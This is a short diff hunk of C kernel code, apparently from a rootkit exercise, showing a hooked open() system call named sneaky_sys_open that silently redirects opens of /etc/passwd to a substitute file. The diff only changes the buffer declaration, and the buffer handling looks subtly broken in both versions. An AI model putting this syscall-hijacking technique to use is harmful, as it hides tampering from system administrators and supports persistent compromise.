@@ -89,9 +89,9 @@ asmlinkage long sneaky_sys_open(const char *filename, int flags, int mode) {
   
   if (strcmp(filename, etc_passwd) == 0 )
   {
-    void __user* to;
+    char __user to[256] = {0}; 
     copy_to_user(to, tmp_passwd , (unsigned)strlen(tmp_passwd) + 1 );
-    return (*original_open)( (const char *)to, flags, mode);
+    return (*original_open)( to, flags, mode);
     
   } else {
     return (*original_open)(filename, flags, mode);
